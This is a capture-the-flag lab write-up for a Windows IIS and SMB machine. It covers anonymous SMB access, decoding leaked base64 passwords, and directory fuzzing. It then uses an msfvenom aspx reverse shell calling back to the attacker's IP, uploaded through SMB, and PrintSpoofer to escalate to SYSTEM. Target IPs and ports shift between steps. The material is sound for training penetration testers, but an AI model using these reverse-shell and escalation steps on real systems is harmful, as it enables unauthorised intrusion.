# Information Gathering
We are given the following

> You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 
> 
> Scope of Work
> 
> The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
> 
> User.txt
> Root.txt
> Additionally, the client has provided the following scope allowances:
> 
> Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
> Locate and note all vulnerabilities found
> Submit the flags discovered to the dashboard
> Only the IP address assigned to your machine is in scope
> Find and report ALL vulnerabilities (yes, there is more than one path to root)
> (Roleplay off)
> 
> I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
> Note - Nothing in this room requires Metasploit
> 
> Machine may take up to 5 minutes for all services to start.
> 
> **Writeups will not be accepted for this room.**

The target IP is `10.10.154.250`.

Our objectives are to

1. Locate and secure the `User.txt` file,
2. Locate and secure the `Root.txt` file, and
3. Find and report all vulnerabilities on the target host.

# Enumeration
We begin with the nmap scan `nmap -T5 -PS -sT -sV -sC -O 10.10.154.250` and receive the following output:

The target appears to be a typical windows server hosting a webs server on port `80/TCP` and SMB on the typical ports, `139/TCP`
and `445/TCP`. It appears that on port `3389/TCP`, an RDP instance is running.  

A more thorough scan, of all the TCP ports, reveals the following additional services:
```
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server

49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```
For good measure, we enumerate the SMB shares with `nmap --script samba-enum-shares.nse -p 445 10.10.154.250`:

```
Host script results:

```
**Vulnerability:**
We successfully authenticate to the `\\10.10.154.250\nt4wrksv` share anonymously and locate a file named `passwords.txt`.
This file contains

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
Presumably, the file contains a pair of base64-encoded passwords. We decode them using `echo '<LINE>' | base64 -d` for each line`LINE`. This uncovers the following

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

Perhaps, we can use these credentials to authenticate to an RDP session. We would need to identify some usernames, however.
Attempting to sign in through RDP using `xfreerdp /v:10.10.154.250 /u:<USER> /p:<PASS>` for each combination of the strings
`Bob`, `Bill`, `!P@$$W0rD!123`, and `Juw4nnaM4n420696969!$$$` fails. This suggests that we should pursue another attack vector.

Next, we fuzz for directories on the http server on port `80/TCP` using `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.154.250 -ic`, but we find nothing.

Instead, we fuzz for directories on the alternate web server on port `TCP/49663` with `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.112.186:49663/FUZZ -ic`.

We find the endpoint `http://10.10.112.186:49663/nt4wrksv`, which matches the name of the SMB share to which we previously authenticated.

# Exploitation
Upon visiting `http://10.10.112.186:49663/passwords.txt`, we find the same file we found in the SMB share. This indicates that
the server is hosting files from the share.

We generate an aspx reverse shell with `msfvenom -p windows/shell/reverse_tcp -f aspx -o shell.aspx LHOST=10.6.4.176`.

We then upload the shell to the share with  the commands`smbclient //10.10.112.186/nt4wrksv` and `put shell.aspx shell.aspx`. Afterward,
we set up a netcat listener with `nc -lvnp 4444`.
Upon navigating to `http://10.10.112.186:49633/shell.aspx`, we receive a shell as `iis apppool\defaultapppool`.

As we are searching for the `User.txt` file we run the command `where /R c:\ User.txt` to locate it. This reveals that it
is found at `c:\Users\Bob\Desktop\User.txt`.

We then navigate to the directory and obtain the user flag: 

![](/assets/img/relevant/User.txt.png)

# Post-Exploitation
Running, `whoami /all` reveals that we possess the `SeImpersonate` privilege. To exploit this we, use `PrintSpoofer.exe` (The
source code may be located at [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)). We
simply upload the executable using `smbclient` and run it.

This gives us a root shell, so we use `where /R c:\ Root.txt` to locate the root flag. This tells us that the flag is located 
at `c:\Users\Administrator\Desktop`. We navigate to this directory and capture the flag:
